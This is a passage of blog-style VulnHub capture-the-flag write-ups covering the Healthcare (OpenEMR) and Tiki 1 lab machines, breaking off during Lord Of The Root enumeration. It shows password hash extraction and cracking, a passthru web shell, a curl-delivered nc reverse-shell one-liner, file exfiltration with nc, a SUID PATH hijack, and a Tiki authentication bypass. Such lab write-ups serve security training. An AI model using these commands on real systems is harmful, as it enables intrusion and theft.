<p>I ran the exploit and the credentials of two users were retrieved.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>python3 exp.py 

   ____                   ________  _______     __ __   ___ ____ 
  / __ <span class="se">\_</span>___  ___  ____  / ____/  |/  / __ <span class="se">\ </span>  / // /  &lt;  // __ <span class="se">\</span>
 / / / / __ <span class="se">\/</span> _ <span class="se">\/</span> __ <span class="se">\/</span> __/ / /|_/ / /_/ /  / // /_  / // / / /
/ /_/ / /_/ /  __/ / / / /___/ /  / / _, _/  /__  __/ / // /_/ / 
<span class="se">\_</span>___/ .___/<span class="se">\_</span>__/_/ /_/_____/_/  /_/_/ |_|     /_/ <span class="o">(</span>_<span class="o">)</span>_<span class="o">(</span>_<span class="o">)</span>____/  
    /_/
    ____  ___           __   _____ ____    __    _               
   / __ <span class="o">)</span>/ <span class="o">(</span>_<span class="o">)</span>___  ____/ /  / ___// __ <span class="se">\ </span> / /   <span class="o">(</span>_<span class="o">)</span>              
  / /_/ / / / __ <span class="se">\/</span> __  /   <span class="se">\_</span>_ <span class="se">\/</span> / / / / /   / /               
 / /_/ / / / / / / /_/ /   ___/ / /_/ / / /___/ /                
/_____/_/_/_/ /_/<span class="se">\_</span>_,_/   /____/<span class="se">\_</span>__<span class="se">\_\/</span>_____/_/   exploit by @ikuamike 

<span class="o">[</span>+] Finding number of users...
<span class="o">[</span>+] Found number of <span class="nb">users</span>: 2
<span class="o">[</span>+] Extracting username and password hash...
admin:3863efef9ee2bfbc51ecdca359c6302bed1389e8
medical:ab24aed5a7c4ad45615cd7e0da816eea39e4895d
</code></pre></div></div>

<p>Before cracking we need to identify the password hash, the tool detected a possible SHA-1.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span><span class="nb">echo</span> <span class="s1">'3863efef9ee2bfbc51ecdca359c6302bed1389e8'</span> | hashid
Analyzing <span class="s1">'3863efef9ee2bfbc51ecdca359c6302bed1389e8'</span>
<span class="o">[</span>+] SHA-1 
<span class="o">[</span>+] Double SHA-1 
<span class="o">[</span>+] RIPEMD-160 
<span class="o">[</span>+] Haval-160 
<span class="o">[</span>+] Tiger-160 
<span class="o">[</span>+] HAS-160 
<span class="o">[</span>+] LinkedIn 
<span class="o">[</span>+] Skein-256<span class="o">(</span>160<span class="o">)</span> 
<span class="o">[</span>+] Skein-512<span class="o">(</span>160<span class="o">)</span>
</code></pre></div></div>

<p>I copied the hashes into a file and prepared the rockyou wordlist for use it with john the ripper.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span><span class="nb">echo</span> <span class="nt">-e</span> <span class="s2">"3863efef9ee2bfbc51ecdca359c6302bed1389e8</span><span class="se">\n</span><span class="s2">ab24aed5a7c4ad45615cd7e0da816eea39e4895d"</span> <span class="o">&gt;</span> openemr.hash

root@kali:~<span class="nv">$ </span>zcat /usr/share/wordlists/rockyou.txt.gz <span class="o">&gt;</span> rockyou.txt
</code></pre></div></div>

<p>John discovered the password for the two hashes.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>john openemr.hash <span class="nt">-format</span><span class="o">=</span>RAW-SHA1 <span class="nt">-wordlist</span><span class="o">=</span>rockyou.txt 
Using default input encoding: UTF-8
Loaded 2 password hashes with no different salts <span class="o">(</span>Raw-SHA1 <span class="o">[</span>SHA1 128/128 AVX 4x]<span class="o">)</span>
Warning: no OpenMP support <span class="k">for </span>this <span class="nb">hash type</span>, consider <span class="nt">--fork</span><span class="o">=</span>2
Press <span class="s1">'q'</span> or Ctrl-C to abort, almost any other key <span class="k">for </span>status
medical          <span class="o">(</span>?<span class="o">)</span>
ackbar           <span class="o">(</span>?<span class="o">)</span>
</code></pre></div></div>

<h3 id="login-to-openemr">Login to OpenEMR</h3>

<p>I logged in to OpenEMR as the admin user.</p>

<p><img src="/assets/images/healthcare/screenshot-5.png" alt="" /></p>

<p><img src="/assets/images/healthcare/screenshot-6.png" alt="" /></p>

<p>Ones here, in the following path I found a way to run php code.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Administration <span class="o">&gt;</span> Files
</code></pre></div></div>

<p>We modify the script adding the passthru function that allows us to execute system commands, and then we save it.</p>

<p><img src="/assets/images/healthcare/screenshot-7.png" alt="" /></p>

<p>With the following curl request we can verify that our command was interpreted correctly.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>curl <span class="nt">-s</span> http://192.168.179.163/openemr/sites/default/config.php?z<span class="o">=</span><span class="nb">id
</span><span class="nv">uid</span><span class="o">=</span>479<span class="o">(</span>apache<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>416<span class="o">(</span>apache<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>416<span class="o">(</span>apache<span class="o">)</span>
</code></pre></div></div>

<p>Then, we need to start a netcat listener and execute the following curl request.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>curl <span class="nt">-s</span> http://192.168.179.163/openemr/sites/default/config.php?z<span class="o">=</span><span class="si">$(</span>urlencode <span class="nt">-m</span> <span class="s1">'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 192.168.179.1 443 &gt;/tmp/f'</span><span class="si">)</span>
</code></pre></div></div>

<p>We have a reverse shell with apache privileges.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>nc <span class="nt">-vlnp</span> 443
listening on <span class="o">[</span>any] 443 ...
connect to <span class="o">[</span>192.168.179.1] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>192.168.179.163] 43690
sh: no job control <span class="k">in </span>this shell
sh-4.1<span class="nv">$ </span>python <span class="nt">-c</span> <span class="s1">'import pty;pty.spawn("/bin/bash")'</span>   
python <span class="nt">-c</span> <span class="s1">'import pty;pty.spawn("/bin/bash")'</span>
bash-4.1<span class="nv">$ </span><span class="nb">whoami
whoami
</span>apache
</code></pre></div></div>

<p>Listing the SUID binaries an uncommon binary called healthcheck catches my attention.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bash-4.1<span class="nv">$ </span>find / <span class="nt">-perm</span> <span class="nt">-4000</span> <span class="nt">-type</span> f 2&gt;/dev/null
...
/usr/bin/healthcheck
...
</code></pre></div></div>

<p>I downloaded the binary to the attacking machine.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>nc <span class="nt">-vlnp</span> 5656 <span class="o">&gt;</span> healthcheck

bash-4.1<span class="nv">$ </span>nc 192.168.179.1 5656 &lt; /usr/bin/healthcheck
</code></pre></div></div>

<p>I decompiled the binary with cutter, and I could see a series of commands running without the absolute path, we can hijack the path of these commands to get root.</p>

<p><img src="/assets/images/healthcare/screenshot-8.png" alt="" /></p>

<h2 id="privilege-escalation">Privilege Escalation</h2>
<h3 id="suid-binary">SUID Binary</h3>

<p>I moved to the shm directory, created a symbolic link to the /bin/sh binary with the name of the clear command, exported the /dev/shm directory to the PATH environment variable, and finally ran the healthcheck binary, giving me a root shell.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bash-4.1<span class="nv">$ </span><span class="nb">cd</span> /dev/shm
bash-4.1<span class="nv">$ </span><span class="nb">ln</span> <span class="nt">-s</span> /bin/sh clear
<span class="nb">ln</span> <span class="nt">-s</span> /bin/sh clear
bash-4.1<span class="nv">$ </span><span class="nb">export </span><span class="nv">PATH</span><span class="o">=</span>/dev/shm:<span class="nv">$PATH</span>
<span class="nb">export </span><span class="nv">PATH</span><span class="o">=</span>/dev/shm:<span class="nv">$PATH</span>
bash-4.1<span class="nv">$ </span><span class="nb">echo</span> <span class="nv">$PATH</span>
<span class="nb">echo</span> <span class="nv">$PATH</span>
/dev/shm:/sbin:/usr/sbin:/bin:/usr/bin
bash-4.1<span class="nv">$ </span>/usr/bin/healthcheck
/usr/bin/healthcheck
gpg-agent[12879]: error creating <span class="sb">`</span>/.gnupg/gpg-agent-info<span class="s1">': No such file or directory
[root@localhost shm]# id
id
uid=0(root) gid=0(root) groups=0(root),416(apache)
[root@localhost shm]# cd /root                                                 
cd /root
[root@localhost root]# ls                                                      
ls
Desktop/    drakx/        healthcheck.c  sudo.rpm
Documents/  healthcheck*  root.txt       tmp/
</span></code></pre></div></div>

<p>Below you can see the vulnerable healthcheck.c script, and the root flag.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span>root@localhost root]# <span class="nb">cat </span>healthcheck.c                                       
<span class="nb">cat </span>healthcheck.c
<span class="c">#include&lt;unistd.h&gt;</span>
void main<span class="o">()</span>
<span class="o">{</span> setuid<span class="o">(</span>0<span class="o">)</span><span class="p">;</span>
  setgid<span class="o">(</span>0<span class="o">)</span><span class="p">;</span>
  system<span class="o">(</span><span class="s2">"clear ; echo 'System Health Check' ; echo '' ; echo 'Scanning System' ; sleep 2 ; ifconfig ; fdisk -l ; du -h"</span><span class="o">)</span><span class="p">;</span>
<span class="o">}</span>
</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span>root@localhost root]# <span class="nb">cat </span>root.txt                                            
<span class="nb">cat </span>root.txt
██    ██  ██████  ██    ██     ████████ ██████  ██ ███████ ██████      ██   ██  █████  ██████  ██████  ███████ ██████  ██ 
 ██  ██  ██    ██ ██    ██        ██    ██   ██ ██ ██      ██   ██     ██   ██ ██   ██ ██   ██ ██   ██ ██      ██   ██ ██ 
  ████   ██    ██ ██    ██        ██    ██████  ██ █████   ██   ██     ███████ ███████ ██████  ██   ██ █████   ██████  ██ 
   ██    ██    ██ ██    ██        ██    ██   ██ ██ ██      ██   ██     ██   ██ ██   ██ ██   ██ ██   ██ ██      ██   ██    
   ██     ██████   ██████         ██    ██   ██ ██ ███████ ██████      ██   ██ ██   ██ ██   ██ ██████  ███████ ██   ██ ██ 
                                                                                                                          
                                                                                                                          
Thanks <span class="k">for </span>Playing!

Follow me at: http://v1n1v131r4.com


root <span class="nb">hash</span>: eaff25eaa9ffc8b62e3dfebf70e83a7b

</code></pre></div></div>


  
    <h1 class="post-title">VulnHub - Tiki 1</h1>
	<p class="post-date text-bold text-upcase">
	<span>November 2021</span>
	</p>

	<p class="post-date text-bold text-upcase">
  
</p>

<div class="soopr-btn"
   data-twitter="SooprCo"
>
</div>

    <p><strong>Description:</strong> The webserver got compromised. The attacker used an 0day, so we dont know how he got into the admin panel. Investigate that.</p>

<p><strong>Author:</strong> Silky</p>

<p><strong>Operating System:</strong> Linux</p>

<p><strong>Aim:</strong> To get root shell and read the flag.</p>

<p><strong>Download:</strong> <a href="https://www.vulnhub.com/entry/tiki-1,525/">https://www.vulnhub.com/entry/tiki-1,525/</a></p>

<h2 id="information-gathering">Information Gathering</h2>
<h3 id="host-discovery">Host Discovery</h3>

<p>With a ping sweep performed on the local network was possible to locate our target host.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>nmap <span class="nt">-n</span> <span class="nt">-sn</span> 192.168.179.1/24
Starting Nmap 7.91 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-11-06 20:52 <span class="nt">-05</span>
Nmap scan report <span class="k">for </span>192.168.179.162
Host is up <span class="o">(</span>0.00056s latency<span class="o">)</span><span class="nb">.</span>
MAC Address: 00:0C:29:0A:0C:8A <span class="o">(</span>VMware<span class="o">)</span>
Nmap scan report <span class="k">for </span>192.168.179.254
Host is up <span class="o">(</span>0.00069s latency<span class="o">)</span><span class="nb">.</span>
MAC Address: 00:50:56:F3:D6:F4 <span class="o">(</span>VMware<span class="o">)</span>
Nmap scan report <span class="k">for </span>192.168.179.1
Host is up.
Nmap <span class="k">done</span>: 256 IP addresses <span class="o">(</span>3 hosts up<span class="o">)</span> scanned <span class="k">in </span>4.64 seconds
</code></pre></div></div>

<h3 id="port-scanning">Port Scanning</h3>

<p>A full TCP port scann was performed to discover open ports.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>nmap <span class="nt">-n</span> <span class="nt">-T4</span> <span class="nt">-v</span> <span class="nt">-p1-65535</span> 192.168.179.162 <span class="nt">-oG</span> nmap/all-tcp-ports.txt
...
PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds
</code></pre></div></div>

<h3 id="service-enumeration">Service Enumeration</h3>

<p>With nmap I performed service enumeration, OS detection, script scanning and traceroute.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>nmap <span class="nt">-n</span> <span class="nt">-v</span> <span class="nt">-A</span> <span class="nt">-p22</span>,80,139,445 192.168.179.162 <span class="nt">-oN</span> nmap/enum-tcp-services.txt
...
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
| ssh-hostkey:
|   3072 a3:d8:4a:89:a9:25:6d:07:c5:3d:76:28:06:ed:d1:c0 <span class="o">(</span>RSA<span class="o">)</span>
|   256 e7:b2:89:05:54:57:dc:02:f4:8c:3a:7c:55:8b:51:aa <span class="o">(</span>ECDSA<span class="o">)</span>
|_  256 fd:77:07:2b:4a:16:3a:01:6b:e0:00:0c:0a:36:d8:2f <span class="o">(</span>ED25519<span class="o">)</span>
80/tcp  open  http        Apache httpd 2.4.41 <span class="o">((</span>Ubuntu<span class="o">))</span>
| http-methods:
|_  Supported Methods: OPTIONS HEAD GET POST
| http-robots.txt: 1 disallowed entry
|_/tiki/
|_http-server-header: Apache/2.4.41 <span class="o">(</span>Ubuntu<span class="o">)</span>
|_http-title: Apache2 Ubuntu Default Page: It works
139/tcp open  netbios-ssn Samba smbd 4.6.2
445/tcp open  netbios-ssn Samba smbd 4.6.2
MAC Address: 00:0C:29:0A:0C:8A <span class="o">(</span>VMware<span class="o">)</span>
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 5.0 - 5.3 <span class="o">(</span>99%<span class="o">)</span>, Linux 2.6.32 <span class="o">(</span>96%<span class="o">)</span>, Linux 3.2 - 4.9 <span class="o">(</span>96%<span class="o">)</span>, Netgear ReadyNAS 2100 <span class="o">(</span>RAIDiator 4.2.24<span class="o">)</span> <span class="o">(</span>96%<span class="o">)</span>, Linux 2.6.32 - 3.10 <span class="o">(</span>96%<span class="o">)</span>, Linux 4.15 - 5.6 <span class="o">(</span>96%<span class="o">)</span>, Linux 5.3 - 5.4 <span class="o">(</span>96%<span class="o">)</span>, Sony X75CH-series Android TV <span class="o">(</span>Android 5.0<span class="o">)</span> <span class="o">(</span>95%<span class="o">)</span>, Linux 3.1 <span class="o">(</span>95%<span class="o">)</span>, Linux 3.2 <span class="o">(</span>95%<span class="o">)</span>
No exact OS matches <span class="k">for </span>host <span class="o">(</span><span class="nb">test </span>conditions non-ideal<span class="o">)</span><span class="nb">.</span>
Uptime guess: 5.314 days <span class="o">(</span>since Wed Nov 10 13:24:17 2021<span class="o">)</span>
Network Distance: 1 hop
TCP Sequence Prediction: <span class="nv">Difficulty</span><span class="o">=</span>263 <span class="o">(</span>Good luck!<span class="o">)</span>
IP ID Sequence Generation: All zeros
Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel

Host script results:
| nbstat: NetBIOS name: UBUNTU, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; <span class="o">(</span>unknown<span class="o">)</span>
| Names:
|   UBUNTU&lt;00&gt;           Flags: &lt;unique&gt;&lt;active&gt;
|   UBUNTU&lt;03&gt;           Flags: &lt;unique&gt;&lt;active&gt;
|   UBUNTU&lt;20&gt;           Flags: &lt;unique&gt;&lt;active&gt;
|   <span class="se">\x</span>01<span class="se">\x</span>02__MSBROWSE__<span class="se">\x</span>02&lt;01&gt;  Flags: &lt;group&gt;&lt;active&gt;
|   WORKGROUP&lt;00&gt;        Flags: &lt;group&gt;&lt;active&gt;
|   WORKGROUP&lt;1d&gt;        Flags: &lt;unique&gt;&lt;active&gt;
|_  WORKGROUP&lt;1e&gt;        Flags: &lt;group&gt;&lt;active&gt;
| smb2-security-mode:
|   2.02:
|_    Message signing enabled but not required
| smb2-time:
|   <span class="nb">date</span>: 2021-11-16T01:56:54
|_  start_date: N/A
</code></pre></div></div>

<h3 id="samba-enumeration">Samba Enumeration</h3>

<p>Enumerating with enum4linux I found a system user and a shared folder named Notes.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>enum4linux <span class="nt">-a</span> 192.168.179.162
...
 <span class="o">================================</span> 
|    Users on 192.168.179.162    |
 <span class="o">================================</span> 
index: 0x1 RID: 0x3e8 acb: 0x00000010 Account: silky    Name: Silky     Desc: 

user:[silky] rid:[0x3e8]

 <span class="o">============================================</span> 
|    Share Enumeration on 192.168.179.162    |
 <span class="o">============================================</span> 

        Sharename       Type      Comment 
        <span class="nt">---------</span>       <span class="nt">----</span>      <span class="nt">-------</span> 
        print<span class="nv">$ </span>         Disk      Printer Drivers
        Notes           Disk      My Notes
        IPC<span class="nv">$ </span>           IPC       IPC Service <span class="o">(</span>ubuntu server <span class="o">(</span>Samba, Ubuntu<span class="o">))</span>
</code></pre></div></div>

<p>An anonymous login to the shared folder Notes allowed me to find a Mail.txt file, so I downloaded it to the attacking machine.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>smbclient //192.168.179.162/Notes <span class="nt">-N</span>
Try <span class="s2">"help"</span> to get a list of possible commands.
smb: <span class="se">\&gt;</span> <span class="nb">ls</span>
  <span class="nb">.</span>                                   D        0  Wed Jul 29 08:52:09 2020
  ..                                  D        0  Thu Jul 30 14:32:11 2020
  Mail.txt                            N      244  Wed Jul 29 08:52:05 2020

                19992176 blocks of size 1024. 10688056 blocks available
                
smb: <span class="se">\&gt;</span> get Mail.txt
getting file <span class="se">\M</span>ail.txt of size 244 as Mail.txt <span class="o">(</span>2.9 KiloBytes/sec<span class="o">)</span> <span class="o">(</span>average 2.9 KiloBytes/sec<span class="o">)</span>
</code></pre></div></div>

<p>This file contains a password for the silky user.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span><span class="nb">cat </span>Mail.txt 
Hi Silky
because of a current Breach we had to change all Passwords,
please note that it was a 0day, we don<span class="s1">'t know how he made it.

Your new CMS-password is now 51lky571k1, 
please investigate how he made it into our Admin Panel.

Cheers Boss.
</span></code></pre></div></div>

<h3 id="web-enumeration">Web Enumeration</h3>

<p>The scan with nmap reveals that the robots.txt file is available, I accessed it and found a directory called tiki.</p>

<p><img src="/assets/images/tiki/screenshot-1.png" alt="" /></p>

<p>This redirected me to the tikiwiki homepage.</p>

<p><img src="/assets/images/tiki/screenshot-2.png" alt="" /></p>

<p>I logged in as the silky user, but couldn’t find a way to execute system commands.</p>

<p><img src="/assets/images/tiki/screenshot-3.png" alt="" /></p>

<p><img src="/assets/images/tiki/screenshot-4.png" alt="" /></p>

<p>So I focused to locate its current version.</p>

<p><img src="/assets/images/tiki/screenshot-5.png" alt="" /></p>

<p>There’s an exploit available for this tikiwiki version.</p>

<p>Authentication Bypass vulnerability, allows remote unauthenticated attackers to bypass the login page which results in a full compromise of Tiki WikiCMS. An Attacker is able to bruteforce the Admin account until it is locked. After that an emptyPassword can be used to authenticate as admin to get access, more information about this vulnerability you can find it <a href="https://github.com/S1lkys/CVE-2020-15906">here</a>.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>searchsploit tiki wiki 21.1
<span class="nt">------------------------------------------------------------</span> <span class="nt">------------------------</span>
 Exploit Title                                              |  Path
<span class="nt">------------------------------------------------------------</span> <span class="nt">------------------------</span>
Tiki Wiki CMS Groupware 21.1 - Authentication Bypass        | php/webapps/48927.py
<span class="nt">------------------------------------------------------------</span> <span class="nt">------------------------</span>
</code></pre></div></div>

<h2 id="exploitation">Exploitation</h2>

<p>I performed a copy of this exploit to my current directory.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>searchsploit <span class="nt">-m</span> php/webapps/48927.py
root@kali:~<span class="nv">$ </span><span class="nb">cp </span>48927.py exp.py
</code></pre></div></div>

<p>I ran the script adding as parameter the IP address of the victim machine.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>python3 exp.py 192.168.179.162
Admin Password got removed.
Use BurpSuite to login into admin without a password 
Admin Password got removed.
Use BurpSuite to login into admin without a password 
Admin Password got removed.
Use BurpSuite to login into admin without a password 
Admin Password got removed.
Use BurpSuite to login into admin without a password 
Admin Password got removed.
Use BurpSuite to login into admin without a password 
Admin Password got removed.
Use BurpSuite to login into admin without a password 
Admin Password got removed.
Use BurpSuite to login into admin without a password 
Admin Password got removed.
Use BurpSuite to login into admin without a password 
Admin Password got removed.
Use BurpSuite to login into admin without a password 
Admin Password got removed.
Use BurpSuite to login into admin without a password 
Admin Password got removed.
Use BurpSuite to login into admin without a password 
Admin Password got removed.
Use BurpSuite to login into admin without a password 
Admin Password got removed.
Use BurpSuite to login into admin without a password
</code></pre></div></div>

<p>You need set up a web proxy to intercept the form’s post request and remove the password field value, as shown below:</p>

<p><img src="/assets/images/tiki/screenshot-6.png" alt="" /></p>

<p>We have logged in as the admin user.</p>

<p><img src="/assets/images/tiki/screenshot-7.png" alt="" /></p>

<p>In the following path I found a post called Credentials.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Wiki <span class="o">&gt;</span> List Pages
</code></pre></div></div>

<p><img src="/assets/images/tiki/screenshot-8.png" alt="" /></p>

<p>I clicked on Credentials and discovered the silky’s password.</p>

<p><img src="/assets/images/tiki/screenshot-9.png" alt="" /></p>

<h3 id="access-via-ssh">Access via SSH</h3>

<p>I accessed to the server via SSH as the silky user.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>ssh silky@192.168.179.162                                                                                                                         
silky@192.168.179.162<span class="s1">'s password:                                                                                                                                   
Welcome to Ubuntu 20.04.1 LTS (GNU/Linux 5.4.0-42-generic x86_64)                                                                                                 
                                                                                                                                                                    
 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage


1 Aktualisierung kann sofort installiert werden.
0 dieser Aktualisierung sind Sicherheitsaktualisierungen.
Um zu sehen, wie diese zusätzlichen Updates ausgeführt werden: apt list --upgradable


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Your Hardware Enablement Stack (HWE) is supported until April 2025.
Last login: Fri Jul 31 09:50:24 2020 from 192.168.56.1
silky@ubuntu:~$ id
uid=1000(silky) gid=1000(silky) Gruppen=1000(silky),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),120(lpadmin),131(lxd),132(sambashare)
</span></code></pre></div></div>

<h2 id="privilege-escalation">Privilege Escalation</h2>
<h3 id="sudo-permissions">Sudo Permissions</h3>

<p>The silky user belongs to the sudo group, to get root you just need tu execute the following command specifying his password.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>silky@ubuntu:~<span class="nv">$ </span><span class="nb">sudo </span>su -
<span class="o">[</span><span class="nb">sudo</span><span class="o">]</span> Passwort für silky:
root@ubuntu:~# <span class="nb">whoami
</span>root
root@ubuntu:~# <span class="nb">ls
</span>flag.txt
root@ubuntu:~# <span class="nb">cat </span>flag.txt 

 ██████╗ ██████╗ ███╗   ██╗ ██████╗ ██████╗  █████╗ ████████╗██╗   ██╗██╗      █████╗ ████████╗██╗ ██████╗ ███╗   ██╗███████╗██╗
██╔════╝██╔═══██╗████╗  ██║██╔════╝ ██╔══██╗██╔══██╗╚══██╔══╝██║   ██║██║     ██╔══██╗╚══██╔══╝██║██╔═══██╗████╗  ██║██╔════╝██║
██║     ██║   ██║██╔██╗ ██║██║  ███╗██████╔╝███████║   ██║   ██║   ██║██║     ███████║   ██║   ██║██║   ██║██╔██╗ ██║███████╗██║
██║     ██║   ██║██║╚██╗██║██║   ██║██╔══██╗██╔══██║   ██║   ██║   ██║██║     ██╔══██║   ██║   ██║██║   ██║██║╚██╗██║╚════██║╚═╝
╚██████╗╚██████╔╝██║ ╚████║╚██████╔╝██║  ██║██║  ██║   ██║   ╚██████╔╝███████╗██║  ██║   ██║   ██║╚██████╔╝██║ ╚████║███████║██╗
 ╚═════╝ ╚═════╝ ╚═╝  ╚═══╝ ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝    ╚═════╝ ╚══════╝╚═╝  ╚═╝   ╚═╝   ╚═╝ ╚═════╝ ╚═╝  ╚═══╝╚══════╝╚═╝
                                                                                                                                
You did it ^^
I hope you had fun.
Share your flag with me on Twitter: S1lky_1337


flag:88d8120f434c3b4221937a8cd0668588

</code></pre></div></div>

  
    <h1 class="post-title">VulnHub - Lord Of The Root 1.0.1</h1>
	<p class="post-date text-bold text-upcase">
	<span>November 2021</span>
	</p>

	<p class="post-date text-bold text-upcase">
  
</p>

<div class="soopr-btn"
   data-twitter="SooprCo"
>
</div>

    <p><strong>Description:</strong> This is a boot-to-root machine will not require any guest interaction.</p>

<p><strong>Author:</strong> KookSec</p>

<p><strong>Operating System:</strong> Linux</p>

<p><strong>Aim:</strong> Gain access to the server and read the flag.</p>

<p><strong>Download:</strong> <a href="https://www.vulnhub.com/entry/lord-of-the-root-101,129/">https://www.vulnhub.com/entry/lord-of-the-root-101,129/</a></p>

<h2 id="information-gathering">Information Gathering</h2>
<h3 id="host-discovery">Host Discovery</h3>

<p>On the local network the target machine was discovered using an ARP scan.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>netdiscover <span class="nt">-I</span> vmnet1 <span class="nt">-r</span> 192.168.179.1/24
 Currently scanning: Finished!   |   Screen View: Unique Hosts  
                                                                 
 2 Captured ARP Req/Rep packets, from 2 hosts.   Total size: 84
 _____________________________________________________________________________
   IP            At MAC Address     Count     Len  MAC Vendor / Hostname      
 <span class="nt">-----------------------------------------------------------------------------</span>
 192.168.179.161 00:0c:29:05:a0:43      1      42  VMware, Inc.  
 192.168.179.254 00:50:56:ea:b7:4a      1      42  VMware, Inc.
</code></pre></div></div>

<h3 id="port-scanning">Port Scanning</h3>

<p>I performed a full UDP/TCP scan with unicornscan, the only TCP service available is SSH.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>us <span class="nt">-mT</span> <span class="nt">-Iv</span> <span class="nt">-p</span> 1-65535 192.168.179.161 <span class="nt">-r</span> 3000 <span class="nt">-R</span> 3 <span class="o">&amp;&amp;</span> us <span class="nt">-mU</span> <span class="nt">-Iv</span> <span class="nt">-p</span> 1-65535 192.168.179.161 <span class="nt">-r</span> 3000 <span class="nt">-R</span> 3
adding 192.168.179.161/32 mode <span class="sb">`</span>TCPscan<span class="s1">' ports `1-65535'</span> pps 3000
using interface<span class="o">(</span>s<span class="o">)</span> vmnet1
scaning 1.00e+00 total hosts with 1.97e+05 total packets, should take a little longer than 1 Minutes, 12 Seconds
TCP open 192.168.179.161:22  ttl 64
sender statistics 2923.0 pps with 196605 packets sent total
listener statistics 6 packets recieved 0 packets droped and 0 interface drops
TCP open                     ssh[   22]         from 192.168.179.161  ttl 64 
adding 192.168.179.161/32 mode <span class="sb">`</span>UDPscan<span class="s1">' ports `1-65535'</span> pps 3000
using interface<span class="o">(</span>s<span class="o">)</span> vmnet1
scaning 1.00e+00 total hosts with 1.97e+05 total packets, should take a little longer than 1 Minutes, 12 Seconds
UDP open 192.168.179.161:57025  ttl 64
sender statistics 2883.0 pps with 196632 packets sent total
listener statistics 4 packets recieved 0 packets droped and 0 interface drops
UDP open                 unknown[57025]         from 192.168.179.161  ttl 64
</code></pre></div></div>

<h3 id="ssh-enumeration">SSH Enumeration</h3>

<p>I connected to SSH and could see on the banner a number sequence from 1 to 3 to perform port knocking.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>ssh 192.168.179.161
The authenticity of host <span class="s1">'192.168.179.161 (192.168.179.161)'</span> can<span class="s1">'t be established.
ECDSA key fingerprint is SHA256:XzDLUMxo8ifHi4SciYJYj702X3PfFwaXyKOS07b6xd8.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '</span>192.168.179.161<span class="s1">' (ECDSA) to the list of known hosts.

                                                  .____    _____________________________
                                                  |    |   \_____  \__    ___/\______   \
                                                  |    |    /   |   \|    |    |       _/
                                                  |    |___/    |    \    |    |    |   \
                                                  |_______ \_______  /____|    |____|_  /
                                                          \/       \/                 \/
 ____  __.                     __     ___________      .__                   .___ ___________      ___________       __
|    |/ _| ____   ____   ____ |  | __ \_   _____/______|__| ____   ____    __| _/ \__    ___/___   \_   _____/ _____/  |_  ___________
